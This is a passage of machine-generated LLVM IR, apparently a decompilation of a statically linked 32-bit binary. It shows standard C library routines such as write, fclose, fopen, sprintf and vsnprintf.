  %v4_804e0d9 = call i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 0)
  ret i32 %v4_804e0d9
}

define i32 @__libc_write(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e0e4 = load i32, i32* @edi, align 4
  store i32 %v0_804e0e4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804e0f4 = load i32, i32* @ebx, align 4
  %v4_804e0fc = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_804e0f4, i32* @ebx, align 4
  store i32 %v4_804e0fc, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v4_804e0fc, -4095
  br i1 %tmp, label %dec_label_pc_804e114, label %dec_label_pc_804e108

dec_label_pc_804e108:                             ; preds = %entry
  %v1_804e108 = call i32 @__errno_location(i32 %v0_804e0f4)
  %v0_804e10d = load i32, i32* %edi.global-to-local, align 4
  %v1_804e10d = sub i32 0, %v0_804e10d
  %v2_804e10f = inttoptr i32 %v1_804e108 to i32*
  store i32 %v1_804e10d, i32* %v2_804e10f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804e114

dec_label_pc_804e114:                             ; preds = %entry, %dec_label_pc_804e108
  %v0_804e115 = phi i32 [ %v4_804e0fc, %entry ], [ -1, %dec_label_pc_804e108 ]
  %v2_804e114 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804e114, i32* @edx, align 4
  %v2_804e118 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e118, i32* @edi, align 4
  ret i32 %v0_804e115

; uselistorder directives
  uselistorder i32 %v4_804e0fc, { 1, 0, 2 }
  uselistorder i32 %v0_804e0f4, { 1, 0 }
  uselistorder label %dec_label_pc_804e114, { 1, 0 }
}

define i32 @isspace(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804e120 = load i32, i32* inttoptr (i32 134585816 to i32*), align 8
  %v2_804e125 = mul i32 %arg1, 2
  %v3_804e125 = add i32 %v0_804e120, %v2_804e125
  %v4_804e125 = inttoptr i32 %v3_804e125 to i16*
  %v5_804e125 = load i16, i16* %v4_804e125, align 2
  %v6_804e125 = zext i16 %v5_804e125 to i32
  %v1_804e129 = and i32 %v6_804e125, 32
  ret i32 %v1_804e129
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  %v1_804e134 = add i32 %arg1, 128
  %v6_804e13f = icmp ugt i32 %v1_804e134, 383
  br i1 %v6_804e13f, label %dec_label_pc_804e14a, label %dec_label_pc_804e141

dec_label_pc_804e141:                             ; preds = %entry
  %v0_804e141 = load i32, i32* inttoptr (i32 134585824 to i32*), align 32
  %v2_804e146 = mul i32 %arg1, 2
  %v3_804e146 = add i32 %v0_804e141, %v2_804e146
  %v4_804e146 = inttoptr i32 %v3_804e146 to i16*
  %v5_804e146 = load i16, i16* %v4_804e146, align 2
  %v6_804e146 = sext i16 %v5_804e146 to i32
  store i32 %v6_804e146, i32* @edx, align 4
  br label %dec_label_pc_804e14a

dec_label_pc_804e14a:                             ; preds = %entry, %dec_label_pc_804e141
  %v0_804e14a = phi i32 [ %arg1, %entry ], [ %v6_804e146, %dec_label_pc_804e141 ]
  ret i32 %v0_804e14a

; uselistorder directives
  uselistorder label %dec_label_pc_804e14a, { 1, 0 }
}

define i32 @__errno_location(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_80602e0.157 to i32)
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_804e158 = load i32, i32* @ebp, align 4
  %v0_804e159 = load i32, i32* @edi, align 4
  %v0_804e15a = load i32, i32* @esi, align 4
  %v0_804e15b = load i32, i32* @ebx, align 4
  %v4_804e15f = ptrtoint i16* %arg1 to i32
  store i32 %v4_804e15f, i32* @esi, align 4
  %v1_804e163 = add i32 %v4_804e15f, 52
  %v2_804e163 = inttoptr i32 %v1_804e163 to i32*
  %v3_804e163 = load i32, i32* %v2_804e163, align 4
  store i32 %v3_804e163, i32* @ebp, align 4
  %v1_804e166 = icmp eq i32 %v3_804e163, 0
  %v1_804e168 = icmp eq i1 %v1_804e166, false
  br i1 %v1_804e168, label %dec_label_pc_804e189, label %dec_label_pc_804e16a

dec_label_pc_804e16a:                             ; preds = %entry
  %v1_804e16a = add i32 %v4_804e15f, 56
  store i32 %v1_804e16a, i32* @ebx, align 4
  %v2_804e174 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804e174, i32* @eax, align 4
  %v2_804e179 = call i32 @__pthread_return_void(i32 %v2_804e174, i32 134552351)
  %v0_804e17e = load i32, i32* @ebx, align 4
  %v1_804e181 = call i32 @__pthread_return_0(i32 %v0_804e17e)
  store i32 %v1_804e181, i32* @eax, align 4
  %v0_804e18b.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e189

dec_label_pc_804e189:                             ; preds = %entry, %dec_label_pc_804e16a
  %v0_804e193 = phi i32 [ %v4_804e15f, %entry ], [ %v0_804e18b.pre, %dec_label_pc_804e16a ]
  store i32 0, i32* @edi, align 4
  %v1_804e18b = inttoptr i32 %v0_804e193 to i8*
  %v2_804e18b = load i8, i8* %v1_804e18b, align 1
  %v3_804e18b = and i8 %v2_804e18b, 64
  %v4_804e18b = icmp eq i8 %v3_804e18b, 0
  br i1 %v4_804e18b, label %dec_label_pc_804e189.dec_label_pc_804e19e_crit_edge, label %dec_label_pc_804e190

dec_label_pc_804e189.dec_label_pc_804e19e_crit_edge: ; preds = %dec_label_pc_804e189
  br label %dec_label_pc_804e19e

dec_label_pc_804e190:                             ; preds = %dec_label_pc_804e189
  %v1_804e194 = inttoptr i32 %v0_804e193 to i16*
  %v2_804e194 = call i32 @fflush_unlocked(i16* %v1_804e194)
  store i32 %v2_804e194, i32* @edi, align 4
  %v0_804e1a1.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e19e

dec_label_pc_804e19e:                             ; preds = %dec_label_pc_804e189.dec_label_pc_804e19e_crit_edge, %dec_label_pc_804e190
  %v0_804e1a1 = phi i32 [ %v0_804e193, %dec_label_pc_804e189.dec_label_pc_804e19e_crit_edge ], [ %v0_804e1a1.pre, %dec_label_pc_804e190 ]
  %v1_804e1a1 = add i32 %v0_804e1a1, 4
  %v2_804e1a1 = inttoptr i32 %v1_804e1a1 to i32*
  %v3_804e1a1 = load i32, i32* %v2_804e1a1, align 4
  %v1_804e1a4 = call i32 @__libc_close(i32 %v3_804e1a1)
  %v0_804e1ac = load i32, i32* @esi, align 4
  %v1_804e1ac = add i32 %v0_804e1ac, 4
  %v2_804e1ac = inttoptr i32 %v1_804e1ac to i32*
  store i32 -1, i32* %v2_804e1ac, align 4
  %v2_804e1bd = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_804e1bd, i32* @ebx, align 4
  %v2_804e1c2 = icmp slt i32 %v1_804e1a4, 0
  store i32 -1, i32* @eax, align 4
  %v1_804e1c9 = load i32, i32* @edi, align 4
  %v3_804e1c9 = select i1 %v2_804e1c2, i32 -1, i32 %v1_804e1c9
  store i32 %v3_804e1c9, i32* @edi, align 4
  %v2_804e1cc = call i32 @__pthread_return_void(i32 %v2_804e1bd, i32 134552351)
  %v1_804e1d8 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8059e14.158 to i32))
  %v0_804e1dd = load i32, i32* @global_var_805e0a4.159, align 4
  %v1_804e1e2 = add i32 %v0_804e1dd, 1
  store i32 %v1_804e1e2, i32* @global_var_805e0a4.159, align 4
  store i32 ptrtoint (i32* @global_var_8059e14.158 to i32), i32* @eax, align 4
  %v2_804e1ed = call i32 @__pthread_return_void(i32 %v2_804e1bd, i32 1)
  %v0_804e1f2 = load i32, i32* @esi, align 4
  %v1_804e1f2 = inttoptr i32 %v0_804e1f2 to i32*
  %v2_804e1f2 = load i32, i32* %v1_804e1f2, align 4
  %v1_804e1f7 = and i32 %v2_804e1f2, 24576
  %v1_804e1fc = or i32 %v1_804e1f7, 48
  store i32 %v1_804e1fc, i32* @eax, align 4
  %v1_804e201 = trunc i32 %v1_804e1fc to i16
  %v3_804e201 = inttoptr i32 %v0_804e1f2 to i16*
  store i16 %v1_804e201, i16* %v3_804e201, align 2
  br i1 %v1_804e168, label %dec_label_pc_804e217, label %dec_label_pc_804e206

dec_label_pc_804e206:                             ; preds = %dec_label_pc_804e19e
  %v2_804e20a = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804e20a, i32* @eax, align 4
  %v2_804e20f = call i32 @__pthread_return_void(i32 %v2_804e20a, i32 1)
  store i32 %v2_804e20f, i32* @eax, align 4
  br label %dec_label_pc_804e217

dec_label_pc_804e217:                             ; preds = %dec_label_pc_804e19e, %dec_label_pc_804e206
  %v0_804e217 = load i32, i32* @esi, align 4
  %v1_804e217 = add i32 %v0_804e217, 1
  %v2_804e217 = inttoptr i32 %v1_804e217 to i8*
  %v3_804e217 = load i8, i8* %v2_804e217, align 1
  %v4_804e217 = and i8 %v3_804e217, 64
  %v5_804e217 = icmp eq i8 %v4_804e217, 0
  br i1 %v5_804e217, label %dec_label_pc_804e22b, label %dec_label_pc_804e21d

dec_label_pc_804e21d:                             ; preds = %dec_label_pc_804e217
  %v1_804e220 = add i32 %v0_804e217, 8
  %v2_804e220 = inttoptr i32 %v1_804e220 to i32*
  %v3_804e220 = load i32, i32* %v2_804e220, align 4
  %v1_804e223 = call i32 @free(i32 %v3_804e220)
  store i32 %v1_804e223, i32* @eax, align 4
  br label %dec_label_pc_804e22b

dec_label_pc_804e22b:                             ; preds = %dec_label_pc_804e217, %dec_label_pc_804e21d
  %v2_804e237 = call i32 @__pthread_return_void(i32 %v2_804e1bd, i32 134552351)
  %v1_804e243 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8059e14.158 to i32))
  store i32 ptrtoint (i32* @global_var_8059e14.158 to i32), i32* @eax, align 4
  %v0_804e249 = load i32, i32* @global_var_805e0a8.160, align 8
  %v1_804e249 = add i32 %v0_804e249, 1
  store i32 %v1_804e249, i32* @global_var_805e0a8.160, align 8
  %v2_804e253 = call i32 @__pthread_return_void(i32 %v2_804e1bd, i32 1)
  %v0_804e258 = call i32 @_stdio_openlist_dec_use()
  %v0_804e260 = load i32, i32* @edi, align 4
  store i32 %v0_804e15b, i32* @ebx, align 4
  store i32 %v0_804e15a, i32* @esi, align 4
  store i32 %v0_804e159, i32* @edi, align 4
  store i32 %v0_804e158, i32* @ebp, align 4
  ret i32 %v0_804e260

; uselistorder directives
  uselistorder i32 %v2_804e1bd, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_804e22b, { 1, 0 }
  uselistorder label %dec_label_pc_804e217, { 1, 0 }
  uselistorder label %dec_label_pc_804e19e, { 1, 0 }
  uselistorder label %dec_label_pc_804e189, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_804e277 = inttoptr i32 %arg2 to i8*
  %v5_804e277 = call i32 @_stdio_fopen(i32 %arg1, i8* %v4_804e277, i32 0, i32 -1)
  ret i32 %v5_804e277
}

define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_12 = alloca i32, align 4
  %v2_804e283 = ptrtoint i32* %stack_var_12 to i32
  %v4_804e296 = inttoptr i32 %arg1 to i8*
  %v5_804e296 = call i32 @__GI_vsnprintf(i8* %v4_804e296, i32 -1, i32 %arg2, i32 %v2_804e283)
  ret i32 %v5_804e296
}

define i32 @__GI_vsnprintf(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804e2a0 = load i32, i32* @ebp, align 4
  %v0_804e2a1 = load i32, i32* @edi, align 4
  %v0_804e2a2 = load i32, i32* @esi, align 4
  %v0_804e2a3 = load i32, i32* @ebx, align 4
  store i32 %v0_804e2a3, i32* %stack_var_-16, align 4
  %v4_804e2a7 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804e2a7, i32* @esi, align 4
  %v2_804e2ab = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg2, i32* @edi, align 4
  %v2_804e2b6 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_804e2b6, i32* @ebp, align 4
  store i32 208, i32* %stack_var_-96, align 4
  %v1_804e2d0 = sub i32 -1, %v4_804e2a7
  %v1_804e2e3 = call i32 @__stdio_init_mutex(i32 %v2_804e2ab)
  %v1_804e2f3 = load i32, i32* @edi, align 4
  %tmp = icmp ule i32 %v1_804e2d0, %v1_804e2f3
  %v5_804e2f5 = select i1 %tmp, i32 %v1_804e2d0, i32 %v1_804e2f3
  store i32 %v5_804e2f5, i32* @ebx, align 4
  %v0_804e2f8 = load i32, i32* @esi, align 4
  %v3_804e322 = inttoptr i32 %arg3 to i8*
  %v4_804e322 = call i32 @_vfprintf_internal(i32 %v2_804e2b6, i8* %v3_804e322, i32 %arg4)
  %v1_804e32a = icmp eq i32 %v5_804e2f5, 0
  store i32 %v4_804e322, i32* @edx, align 4
  br i1 %v1_804e32a, label %dec_label_pc_804e346, label %dec_label_pc_804e33f

dec_label_pc_804e33f:                             ; preds = %entry
  %stack_var_-80.0 = inttoptr i32 %v0_804e2f8 to i8*
  store i8 0, i8* %stack_var_-80.0, align 1
  %v0_804e349.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804e346

dec_label_pc_804e346:                             ; preds = %entry, %dec_label_pc_804e33f
  %v0_804e349 = phi i32 [ %v4_804e322, %entry ], [ %v0_804e349.pre, %dec_label_pc_804e33f ]
  %v2_804e34b = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804e34b, i32* @ebx, align 4
  store i32 %v0_804e2a2, i32* @esi, align 4
  store i32 %v0_804e2a1, i32* @edi, align 4
  store i32 %v0_804e2a0, i32* @ebp, align 4
  ret i32 %v0_804e349

; uselistorder directives
  uselistorder i32 %v1_804e2f3, { 1, 0 }
  uselistorder i32 %v1_804e2d0, { 1, 0 }
  uselistorder label %dec_label_pc_804e346, { 1, 0 }
}

define i32 @_stdio_fopen(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804e350 = load i32, i32* @ebp, align 4
  %v0_804e351 = load i32, i32* @edi, align 4
  %v0_804e352 = load i32, i32* @esi, align 4
  %v0_804e353 = load i32, i32* @ebx, align 4
  store i32 %v0_804e353, i32* %stack_var_-16, align 4
  %v4_804e357 = ptrtoint i8* %arg2 to i32
  store i32 %v4_804e357, i32* @edx, align 4
  store i32 %arg1, i32* @esi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %v2_804e367 = load i8, i8* %arg2, align 1
  %v3_804e367 = zext i8 %v2_804e367 to i32
  %v4_804e367 = load i32, i32* @eax, align 4
  %v5_804e367 = and i32 %v4_804e367, -256
  %v6_804e367 = or i32 %v5_804e367, %v3_804e367
  store i32 %v6_804e367, i32* %eax.global-to-local, align 4
  %v10_804e369 = icmp eq i8 %v2_804e367, 114
  br i1 %v10_804e369, label %dec_label_pc_804e3ab, label %dec_label_pc_804e36d

dec_label_pc_804e36d:                             ; preds = %entry
  %v10_804e36d = icmp eq i8 %v2_804e367, 119
  store i32 577, i32* @ebx, align 4
  br i1 %v10_804e36d, label %dec_label_pc_804e3ad, label %dec_label_pc_804e376

dec_label_pc_804e376:                             ; preds = %dec_label_pc_804e36d
  %v10_804e376 = icmp eq i8 %v2_804e367, 97
  store i32 1089, i32* @ebx, align 4
  br i1 %v10_804e376, label %dec_label_pc_804e3ad, label %dec_label_pc_804e37e

dec_label_pc_804e37e:                             ; preds = %dec_label_pc_804e426, %dec_label_pc_804e400, %dec_label_pc_804e376
  %v0_804e37e = load i32, i32* %stack_var_-16, align 4
  %v1_804e37e = call i32 @__errno_location(i32 %v0_804e37e)
  store i32 %v1_804e37e, i32* %eax.global-to-local, align 4
  %v0_804e383 = load i32, i32* @ebp, align 4
  %v1_804e383 = icmp eq i32 %v0_804e383, 0
  %v1_804e385 = inttoptr i32 %v1_804e37e to i32*
  store i32 22, i32* %v1_804e385, align 4
  br i1 %v1_804e383, label %dec_label_pc_804e587, label %dec_label_pc_804e391

dec_label_pc_804e391:                             ; preds = %dec_label_pc_804e449, %dec_label_pc_804e37e
  %v0_804e391 = load i32, i32* @ebp, align 4
  %v1_804e391 = add i32 %v0_804e391, 1
  %v2_804e391 = inttoptr i32 %v1_804e391 to i8*
  %v3_804e391 = load i8, i8* %v2_804e391, align 1
  %v4_804e391 = and i8 %v3_804e391, 32
  %v5_804e391 = icmp eq i8 %v4_804e391, 0
  br i1 %v5_804e391, label %dec_label_pc_804e587, label %dec_label_pc_804e39b

dec_label_pc_804e39b:                             ; preds = %dec_label_pc_804e391
  store i32 %v0_804e391, i32* %stack_var_-76, align 4
  store i32 0, i32* @ebp, align 4
  %v1_804e3a1 = call i32 @free(i32 %v0_804e391)
  br label %dec_label_pc_804e582

dec_label_pc_804e3ab:                             ; preds = %entry
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804e3ad

dec_label_pc_804e3ad:                             ; preds = %dec_label_pc_804e376, %dec_label_pc_804e36d, %dec_label_pc_804e3ab
  %v0_804e3be = phi i32 [ 1089, %dec_label_pc_804e376 ], [ 577, %dec_label_pc_804e36d ], [ 0, %dec_label_pc_804e3ab ]
  %v1_804e3ad = add i32 %v4_804e357, 1
  %v2_804e3ad = inttoptr i32 %v1_804e3ad to i8*
  %v3_804e3ad = load i8, i8* %v2_804e3ad, align 1
  %v12_804e3ad = icmp eq i8 %v3_804e3ad, 98
  %v1_804e3ad.v4_804e357 = select i1 %v12_804e3ad, i32 %v1_804e3ad, i32 %v4_804e357
  store i32 %v1_804e3ad.v4_804e357, i32* %eax.global-to-local, align 4
  %v1_804e3b8 = add i32 %v1_804e3ad.v4_804e357, 1
  %v2_804e3b8 = inttoptr i32 %v1_804e3b8 to i8*
  %v3_804e3b8 = load i8, i8* %v2_804e3b8, align 1
  %v12_804e3b8 = icmp eq i8 %v3_804e3b8, 43
  %v1_804e3bc = icmp eq i1 %v12_804e3b8, false
  br i1 %v1_804e3bc, label %dec_label_pc_804e3c6, label %dec_label_pc_804e3be

dec_label_pc_804e3be:                             ; preds = %dec_label_pc_804e3ad
  %v1_804e3c0 = or i32 %v0_804e3be, 1
  store i32 %v1_804e3c0, i32* %eax.global-to-local, align 4
  %v1_804e3c3 = add nuw nsw i32 %v1_804e3c0, 1
  store i32 %v1_804e3c3, i32* @ebx, align 4
  br label %dec_label_pc_804e3c6

dec_label_pc_804e3c6:                             ; preds = %dec_label_pc_804e3ad, %dec_label_pc_804e3be
  %v0_804e4498 = phi i32 [ %v0_804e3be, %dec_label_pc_804e3ad ], [ %v1_804e3c3, %dec_label_pc_804e3be ]
  %v1_804e3c6 = icmp eq i32 %arg3, 0
  %v1_804e3c8 = icmp eq i1 %v1_804e3c6, false
  br i1 %v1_804e3c8, label %dec_label_pc_804e3fc, label %dec_label_pc_804e3ca

dec_label_pc_804e3ca:                             ; preds = %dec_label_pc_804e3c6
  store i32 80, i32* %stack_var_-76, align 4
  %v1_804e3cf = call i32 @malloc(i32 80)
  store i32 %v1_804e3cf, i32* %eax.global-to-local, align 4
  %v2_804e3d7 = icmp eq i32 %v1_804e3cf, 0
  store i32 %v1_804e3cf, i32* @ebp, align 4
  br i1 %v2_804e3d7, label %dec_label_pc_804e589, label %dec_label_pc_804e3e1

dec_label_pc_804e3e1:                             ; preds = %dec_label_pc_804e3ca
  %v2_804e3cf = inttoptr i32 %v1_804e3cf to i16*
  store i16 8192, i16* %v2_804e3cf, align 2
  %v2_804e3e9 = add i32 %v1_804e3cf, 8
  %v3_804e3e9 = inttoptr i32 %v2_804e3e9 to i32*
  store i32 0, i32* %v3_804e3e9, align 4
  %v2_804e3f0 = add i32 %v1_804e3cf, 56
  store i32 %v2_804e3f0, i32* %eax.global-to-local, align 4
  store i32 %v2_804e3f0, i32* %stack_var_-76, align 4
  %v1_804e3f4 = call i32 @__stdio_init_mutex(i32 %v2_804e3f0)
  store i32 %v1_804e3f4, i32* %eax.global-to-local, align 4
  %v0_804e449.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e3fc

dec_label_pc_804e3fc:                             ; preds = %dec_label_pc_804e3c6, %dec_label_pc_804e3e1
  %v2_804e44f = phi i32 [ %v0_804e4498, %dec_label_pc_804e3c6 ], [ %v0_804e449.pre, %dec_label_pc_804e3e1 ]
  %v2_804e3fc = icmp slt i32 %arg4, 0
  br i1 %v2_804e3fc, label %dec_label_pc_804e449, label %dec_label_pc_804e400

dec_label_pc_804e400:                             ; preds = %dec_label_pc_804e3fc
  %v1_804e402 = and i32 %v2_804e44f, 32771
  %v1_804e408 = add nuw nsw i32 %v1_804e402, 1
  store i32 %v1_804e408, i32* @edx, align 4
  %v0_804e409 = load i32, i32* @esi, align 4
  %v1_804e409 = add i32 %v0_804e409, 1
  %v2_804e40c = and i32 %v1_804e409, %v1_804e408
  store i32 %v2_804e40c, i32* %eax.global-to-local, align 4
  %v12_804e40e = icmp eq i32 %v2_804e40c, %v1_804e408
  %v1_804e410 = load i32, i32* @ebp, align 4
  %v2_804e410 = add i32 %v1_804e410, 4
  %v3_804e410 = inttoptr i32 %v2_804e410 to i32*
  store i32 %arg4, i32* %v3_804e410, align 4
  %v1_804e413 = icmp eq i1 %v12_804e40e, false
  br i1 %v1_804e413, label %dec_label_pc_804e37e, label %dec_label_pc_804e419

dec_label_pc_804e419:                             ; preds = %dec_label_pc_804e400
  %v0_804e419 = load i32, i32* @esi, align 4
  %v1_804e41b = and i32 %v0_804e419, 1024
  %v1_804e41d = xor i32 %v1_804e41b, 1024
  store i32 %v1_804e41d, i32* %eax.global-to-local, align 4
  %v1_804e422 = load i32, i32* @ebx, align 4
  %v2_804e422 = and i32 %v1_804e422, %v1_804e41d
  %v3_804e422 = icmp eq i32 %v2_804e422, 0
  br i1 %v3_804e422, label %dec_label_pc_804e419.dec_label_pc_804e43f_crit_edge, label %dec_label_pc_804e426

dec_label_pc_804e419.dec_label_pc_804e43f_crit_edge: ; preds = %dec_label_pc_804e419
  br label %dec_label_pc_804e43f

dec_label_pc_804e426:                             ; preds = %dec_label_pc_804e419
  store i32 %arg4, i32* %stack_var_-76, align 4
  %v3_804e42f = call i32 @__libc_fcntl(i32 %arg4, i32 4, i32 1024)
  store i32 %v3_804e42f, i32* %eax.global-to-local, align 4
  %v1_804e437 = icmp eq i32 %v3_804e42f, 0
  %v1_804e439 = icmp eq i1 %v1_804e437, false
  br i1 %v1_804e439, label %dec_label_pc_804e37e, label %dec_label_pc_804e426.dec_label_pc_804e43f_crit_edge

dec_label_pc_804e426.dec_label_pc_804e43f_crit_edge: ; preds = %dec_label_pc_804e426
  %v0_804e43f.pre = load i32, i32* @esi, align 4
  %v0_804e445.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e43f

dec_label_pc_804e43f:                             ; preds = %dec_label_pc_804e419.dec_label_pc_804e43f_crit_edge, %dec_label_pc_804e426.dec_label_pc_804e43f_crit_edge
  %v0_804e445 = phi i32 [ %v1_804e422, %dec_label_pc_804e419.dec_label_pc_804e43f_crit_edge ], [ %v0_804e445.pre, %dec_label_pc_804e426.dec_label_pc_804e43f_crit_edge ]
  %v0_804e43f = phi i32 [ %v0_804e419, %dec_label_pc_804e419.dec_label_pc_804e43f_crit_edge ], [ %v0_804e43f.pre, %dec_label_pc_804e426.dec_label_pc_804e43f_crit_edge ]
  %v1_804e43f = and i32 %v0_804e43f, 32768
  %v2_804e445 = or i32 %v1_804e43f, %v0_804e445
  store i32 %v2_804e445, i32* @ebx, align 4
  br label %dec_label_pc_804e46d

dec_label_pc_804e449:                             ; preds = %dec_label_pc_804e3fc
  %v11_804e44b = or i32 %v2_804e44f, 32768
  store i32 %v11_804e44b, i32* %eax.global-to-local, align 4
  %v1_804e44e = add i32 %arg4, 1
  %v8_804e44e = icmp eq i32 %v1_804e44e, 0
  store i32 %v1_804e44e, i32* @edi, align 4
  %v1_804e44f = icmp eq i1 %v8_804e44e, false
  %v4_804e44f = select i1 %v1_804e44f, i32 %v11_804e44b, i32 %v2_804e44f
  store i32 %v4_804e44f, i32* @ebx, align 4
  %v0_804e459 = load i32, i32* @esi, align 4
  store i32 %v0_804e459, i32* %stack_var_-76, align 4
  %v3_804e45a = inttoptr i32 %v0_804e459 to i8*
  %v4_804e45a = call i32 @__libc_open(i8* %v3_804e45a, i32 %v4_804e44f)
  store i32 %v4_804e45a, i32* %eax.global-to-local, align 4
  %v2_804e462 = icmp slt i32 %v4_804e45a, 0
  %v1_804e464 = load i32, i32* @ebp, align 4
  %v2_804e464 = add i32 %v1_804e464, 4
  %v3_804e464 = inttoptr i32 %v2_804e464 to i32*
  store i32 %v4_804e45a, i32* %v3_804e464, align 4
  br i1 %v2_804e462, label %dec_label_pc_804e391, label %dec_label_pc_804e46d

dec_label_pc_804e46d:                             ; preds = %dec_label_pc_804e449, %dec_label_pc_804e43f
  %v0_804e46d = load i32, i32* @ebp, align 4
  %v1_804e46d = inttoptr i32 %v0_804e46d to i32*
  %v2_804e46d = load i32, i32* %v1_804e46d, align 4
  %v2_804e46d.tr = trunc i32 %v2_804e46d to i16
  %v1_804e475 = and i16 %v2_804e46d.tr, 8192
  %v3_804e475 = inttoptr i32 %v0_804e46d to i16*
  store i16 %v1_804e475, i16* %v3_804e475, align 2
  %v0_804e479 = load i32, i32* @ebx, align 4
  store i32 %v0_804e479, i32* %eax.global-to-local, align 4
  %v1_804e47b = and i32 %v0_804e479, -31744
  %v0_804e481 = load i32, i32* @ebp, align 4
  %v1_804e481 = inttoptr i32 %v0_804e481 to i32*
  %v2_804e481 = load i32, i32* %v1_804e481, align 4
  %v1_804e484 = mul i32 %v0_804e479, 16
  %v1_804e487 = and i32 %v1_804e484, 48
  %v1_804e488 = add nuw nsw i32 %v1_804e487, 16
  %v2_804e48b = xor i32 %v1_804e488, 48
  %v2_804e48e = or i32 %v2_804e481, %v1_804e47b
  %v2_804e490 = or i32 %v2_804e48e, %v2_804e48b
  store i32 %v2_804e490, i32* %eax.global-to-local, align 4
  %v1_804e492 = trunc i32 %v2_804e490 to i16
  %v3_804e492 = inttoptr i32 %v0_804e481 to i16*
  store i16 %v1_804e492, i16* %v3_804e492, align 2
  %v0_804e496 = load i32, i32* %stack_var_-76, align 4
  %v1_804e496 = call i32 @__errno_location(i32 %v0_804e496)
  store i32 %v1_804e496, i32* %eax.global-to-local, align 4
  %v0_804e49e = load i32, i32* @ebp, align 4
  %v1_804e49e = inttoptr i32 %v0_804e49e to i16*
  %v2_804e49e = load i16, i16* %v1_804e49e, align 2
  %v3_804e49e = zext i16 %v2_804e49e to i32
  store i32 %v3_804e49e, i32* @ebx, align 4
  %v1_804e4a2 = inttoptr i32 %v1_804e496 to i32*
  %v2_804e4a2 = load i32, i32* %v1_804e4a2, align 4
  store i32 %v2_804e4a2, i32* @edi, align 4
  store i32 %v1_804e496, i32* @esi, align 4
  %v1_804e4a6 = add i32 %v0_804e49e, 4
  %v2_804e4a6 = inttoptr i32 %v1_804e4a6 to i32*
  %v3_804e4a6 = load i32, i32* %v2_804e4a6, align 4
  store i32 %v3_804e4a6, i32* %stack_var_-76, align 4
  %v1_804e4a9 = call i32 @isatty(i32 %v3_804e4a6)
  %v2_804e4b1 = mul i32 %v1_804e4a9, 256
  store i32 %v2_804e4b1, i32* %eax.global-to-local, align 4
  %v0_804e4b4 = load i32, i32* @ebx, align 4
  %v2_804e4b4 = or i32 %v0_804e4b4, %v2_804e4b1
  store i32 %v2_804e4b4, i32* @ebx, align 4
  %v1_804e4b6 = trunc i32 %v2_804e4b4 to i16
  %v2_804e4b6 = load i32, i32* @ebp, align 4
  %v3_804e4b6 = inttoptr i32 %v2_804e4b6 to i16*
  store i16 %v1_804e4b6, i16* %v3_804e4b6, align 2
  %v0_804e4ba = load i32, i32* @edi, align 4
  %v1_804e4ba = load i32, i32* @esi, align 4
  %v2_804e4ba = inttoptr i32 %v1_804e4ba to i32*
  store i32 %v0_804e4ba, i32* %v2_804e4ba, align 4
  %v0_804e4bc = load i32, i32* @ebp, align 4
  %v1_804e4bc = add i32 %v0_804e4bc, 8
  %v2_804e4bc = inttoptr i32 %v1_804e4bc to i32*
  %v3_804e4bc = load i32, i32* %v2_804e4bc, align 4
  %v4_804e4bc = icmp eq i32 %v3_804e4bc, 0
  %v1_804e4c0 = icmp eq i1 %v4_804e4bc, false
  br i1 %v1_804e4c0, label %dec_label_pc_804e4f4, label %dec_label_pc_804e4c2

dec_label_pc_804e4c2:                             ; preds = %dec_label_pc_804e46d
  store i32 4096, i32* %stack_var_-76, align 4
  %v1_804e4ca = call i32 @malloc(i32 4096)
  store i32 %v1_804e4ca, i32* %eax.global-to-local, align 4
  %v1_804e4d2 = icmp eq i32 %v1_804e4ca, 0
  %v1_804e4d4 = load i32, i32* @ebp, align 4
  %v2_804e4d4 = add i32 %v1_804e4d4, 8
